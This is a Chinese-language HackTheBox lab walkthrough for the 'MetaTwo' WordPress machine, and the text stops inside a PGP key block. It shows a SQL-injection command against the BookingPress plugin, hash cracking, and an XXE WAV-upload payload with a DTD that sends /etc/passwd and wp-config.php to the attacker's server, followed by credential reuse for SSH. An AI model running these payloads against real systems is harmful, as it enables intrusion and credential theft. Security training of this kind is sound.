---
tags:
  - HTB/Linux
  - HTB/Easy
---
## 扫描

先用自己写的[这个脚本](./HTB-Shoppy.md#htb_easy_firstscaning)进行首先的基础扫描

- 开放端口：21, 22, 80
- 没发现子域


## 漏洞分析

21端口试了下匿名连接失败。  

22端口先不考虑。

### 80端口

`http://metapress.htb/`

- robots.txt

        User-agent: *
        Disallow: /wp-admin/
        Allow: /wp-admin/admin-ajax.php

        Sitemap: http://metapress.htb/wp-sitemap.xml
    
    - `http://metapress.htb/wp-admin/` 进入登录页面。简单试了下SQLi似乎行不通
    - “Sitemap”无法访问（不过后来又可以了……点了一些链接，似乎只是单纯的页面跳转）

- 网页源码发现：
    - WordPress ver=5.6.2
    - /themes/twentytwentyone/style.css?ver=1.1

#### WPscan扫描（无option）

既然是WordPress，那就先用WPscan扫一波：
```bash
Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://metapress.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
……
```

由于最开始没加参数漏了很多信息，于是先只看到了这几项感兴趣的：

- readme.txt  

        System Requirements

            PHP version 5.6.20 or higher.
            MySQL version 5.0 or higher.
- 同时搜了下之前在网页源码里发现的 `twentytwentyone` 主题（在上面的扫描结果中省略），没发现什么可利用的点
- `XML-RPC`看[hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#xml-rpc)似乎可以利用，但是由于是暴破，在我心里的优先度较低。所以暂时放置，先看看有没有其他突破口

#### 研究网页功能
- 页面下方的搜索框。简单试了下SQLi、XSS似乎行不通
- 页面中央的链接 `http://metapress.htb/events/`。似乎是个注册、订阅events的东西。没发现有什么用 **（暂时）**


#### XML-RPC暴破
由于没什么突破点，不得已尝试一下`XML-RPC`暴破。  
用[hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#xml-rpc)里提到的自动脚本跑了一波默认密码字典（因为觉得如果思路对的话应该不会很难，那么用默认字典即可）
```bash
$ ./exploit.py http://metapress.htb 10 10
__          _________   __      _       _ _
\ \        / /  __ \ \ / /     | |     (_) |
 \ \  /\  / /| |__) \ V / _ __ | | ___  _| |_
  \ \/  \/ / |  ___/ > < | '_ \| |/ _ \| | __|
   \  /\  /  | |    / . \| |_) | | (_) | | |_
    \/  \/   |_|   /_/ \_\ .__/|_|\___/|_|\__|
                         | |   [Version 1.0.0]
                         |_|

[7:53:46] URL is valid!
[7:53:46] connection is successfully establised!
[7:53:46] please provide the username : admin
[7:53:50] 0. wordlist/default.txt
[7:53:50] select your file number : 0
[7:54:9]: 100%|███████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.21s/it]
[8:20:49] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Max retries exceeded with url: /xmlrpc.php (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f9dd2536290>, 'Connection to metapress.htb timed out. (connect timeout=10)'))                                                                
[7:54:8]:  58%|█████████████████████████████████████▏                          | 5811/10000 [26:40<19:13,  3.63it/s]
[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10)                                                                                                                  
[7:54:7]:  57%|████████████████████████████████████▎                           | 5665/10000 [26:43<20:26,  3.53it/s]
[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10)                                                                                                                  
[7:54:6]:  57%|████████████████████████████████████▌                           | 5708/10000 [26:44<20:06,  3.56it/s]
[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10)                                                                                                                  
[7:54:7]:  57%|████████████████████████████████████▋                           | 5742/10000 [26:42<19:48,  3.58it/s]
[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10)                                                                                                                  
[7:54:6]:  56%|███████████████████████████████████▋                            | 5579/10000 [26:44<21:11,  3.48it/s]
[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10):54:6]:  56%|███████████████████████████████████▌                            | 5565/10000 [26:43<34:22,  2.15it/s]
[7:54:6]:  56%|████████████████████████████████████                            | 5640/10000 [26:43<20:39,  3.52it/s]
[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10):54:6]:  56%|███████████████████████████████████▌                            | 5565/10000 [26:43<34:22,  2.15it/s]
[7:54:9]:  58%|████████████████████████████████████▊                           | 5758/10000 [26:41<19:39,  3.60it/s]
[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Max retries exceeded with url: /xmlrpc.php (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f9de8913250>, 'Connection to metapress.htb timed out. (connect timeout=10)'))                                                                
[7:54:7]:  57%|████████████████████████████████████▍                           | 5703/10000 [26:43<20:08,  3.56it/s]
[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10):54:6]:  56%|███████████████████████████████████▌                            | 5565/10000 [26:43<34:22,  2.15it/s]
[7:54:6]:  56%|███████████████████████████████████▌                            | 5565/10000 [26:43<21:18,  3.47it/s]
[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Max retries exceeded with url: /xmlrpc.php (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f9de8913760>, 'Connection to metapress.htb timed out. (connect timeout=10)'))
[7:54:8]:  56%|████████████████████████████████████                            | 5629/10000 [26:41<20:43,  3.51it/s]
[8:20:50] all task are done! 
```

似乎要挺久的，先洗了个澡……回来发现暴破中途断了……

网页访问试了下也不是被ban IP，有点谜。或者是已经过了被ban的时间？  
不过暴破了这么久不行感觉应该不是这个思路。

#### WPscan扫描（有option）

其实是第一次打WordPress……搜了一下WPscan的用法后加上参数再扫了一波：
```bash
$ wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://metapress.htb/ --plugins-detection aggressive

……

[i] Plugin(s) Identified:

[+] bookingpress-appointment-booking
 | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/
 | Last Updated: 2022-12-13T11:42:00.000Z
 | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | [!] The version is out of date, the latest version is 1.0.49
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200
 |
 | Version: 1.0.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | Confirmed By: Translation File (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: 'sion: BookingPress Appointment Booking v1.0.10'

……

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://metapress.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] manager
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

### PoC（CVE-2022-0739）

发现了一个疑似有漏洞的插件。谷歌一波看到这个[PoC](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357):  
```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

一开始没懂，直接复制试了几次似乎不行。  
后来看到这个[Python PoC](https://github.com/destr4ct/CVE-2022-0739)，因为必须要输入一个 `nonce` 随机数，随手试了几个都报错，就迷茫了很久……  
也想不到其他可利用的点，除非换个密码字典用rockyou继续去暴破admin和manager，但是又担心中途断了。而且在线暴破并不好，应该不是这么蠢的方式。

后面又仔细看了看PoC的描述，似乎是说POST过的数据未清理。  
想起来网页也就event那个订阅有POST过数据。  
Burp其实在最开始就开了的，看了眼history，在POST数据里发现了 `_wpnonce` 这个参数！开整！

获得两位用户的hash：
```bash
$ python booking-press-expl.py -u 'http://metapress.htb' -n afab51c6c0
- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```

#### john暴破hash

```bash
$ john --show --format=phpass hash.txt 
manager:partylikearockstar
```

#### 登陆WordPress

admin账号没有暴破成功。姑且用manager登陆一下WordPress。  
成功登入后第一想法就是找上传点，本来以为可以简单地传个php的webshell就行，不过这个网站的上传似乎不能传php。


### PoC（CVE-2021-29447）

谷歌搜一波 `wordpress 5.6.2 upload exploit`，可以发现这个漏洞：CVE-2021-29447。

> <https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447>  
> <https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5>  
> <https://github.com/motikan2010/CVE-2021-29447>  


试了一下接收响应，成功返回了 `/etc/passwd` 的base64编码：
```bash
$ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.6:80/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav


$ cat evil.dtd 
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.6:80/?p=%file;'>" >


$ python -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.186 - - [21/Dec/2022 07:46:28] "GET /evil.dtd HTTP/1.1" 200 -
10.10.11.186 - - [21/Dec/2022 07:46:28] "GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1" 200 -
```

将文件获取的路径换成 `../wp-config.php`  
单纯因为上面的文章里有这个文件就试了下，不过似乎因此找到了很有意义的文件（后来懂了这个是WordPress较重要的文件……）  
返回的base64编码如下:  
```
PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==
```

用[CyberChef](https://gchq.github.io/CyberChef/)解码后发现里面有DB、FTP的账号密码。

DB似乎目前还无从下手，但别忘记我们扫到过FTP端口。  
尝试连接FTP成功，似乎是WordPress和什么邮件的文件夹（备份）？  
一个一个get太慢了，于是参考[这里](https://stackoverflow.com/questions/113886/how-to-recursively-download-a-folder-via-ftp-on-linux)，用wget把FTP上的文件都下载下来慢慢看（注意：密码由于有特殊字符所以要用引号括住）。  
文件挺多的样子，放后台慢慢下。  

**但是其实我是期望get shell的。**  
不过对PHP不太熟悉……又搜了一下看看能否更改将PoC里的 `<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">` 改成命令执行。  
不过似乎不行：  
> php:// — Accessing various I/O streams

以及仔细看了看其实CVE-2021-29447的文章介绍了这个漏洞是：导致远程任意文件泄露和服务器端请求伪造 (SSRF)。

那就暂时先等FTP的文件下完吧……

以及由于之前获取了 `/etc/passwd`，看了眼有个用户（`jnelson:x:1000`）比较像是放user flag的用户，顺便试了试获取 `/home/jnelson/user.txt`。不过虽然有200响应，但是并未获取到什么数据。大概是没有读取权限吧。


## Initial Access

*冲了一会儿浪，FTP下载完毕，竟然有两千多个文件……*

email这个文件夹里的文件让人感兴趣，在里面发现了用户 `jnelson` 的邮箱&密码（现在想想根本没必要把整个FTP的文件都下下来……）：  
```bash
$ cat send_email.php             
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";
```

尝试SSH连接成功~真是曲折啊……


## flag: user

```bash
jnelson@meta2:~$ cat user.txt 
819…………78428
```


## Privilege Escalation

由于之前XXE的漏洞中获取的响应里有DB的账户密码，`/etc/hosts` 文件里也有mysql用户，遂尝试一波连接DB。但是结果显示拒绝我收集到的 `blog` 用户来进行访问……
```bash
jnelson@meta2:~$ mysql -u blog 
ERROR 1045 (28000): Access denied for user 'blog'@'localhost' (using password: NO)
jnelson@meta2:~$ mysql -u blog -h localhost
ERROR 1045 (28000): Access denied for user 'blog'@'localhost' (using password: NO)
```

那只能用通常套路了  

- 确认了一下 `sudo -l`，无利用
- 搜了下SUID文件，没发现异常
- 看了眼用户的家目录，发现个不寻常的文件名，在里面发现了root的什么密钥文件：

```bash
jnelson@meta2:~/.passpie/ssh$ cat root.pass 
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----


hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

/2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

lpF0RatbxQGWBks5F3o=

=uh1B

-----END PGP MESSAGE-----

'
```

看了一下这个 `passpie` 是个命令。  
`list` 看了看有两个用户，有个 `export`，那试试导出密码。  
不过似乎要当前用户的什么密码短语，试了下ssh的密码不行： 
```bash
jnelson@meta2:~/.passpie/ssh$ which passpie
/usr/local/bin/passpie
jnelson@meta2:~/.passpie/ssh$ passpie --help
Usage: passpie [OPTIONS] COMMAND [ARGS]...

...


jnelson@meta2:~/.passpie$ passpie list
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛


jnelson@meta2:~$ passpie export
Usage: passpie export [OPTIONS] FILEPATH

Error: Missing argument "filepath".
jnelson@meta2:~$ passpie export pass
Passphrase: 
Error: Wrong passphrase
```


又看了一圈，发现了个密钥对，估计跟那个密码短语有关：
```bash
jnelson@meta2:~/.passpie$ cat .keys 
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
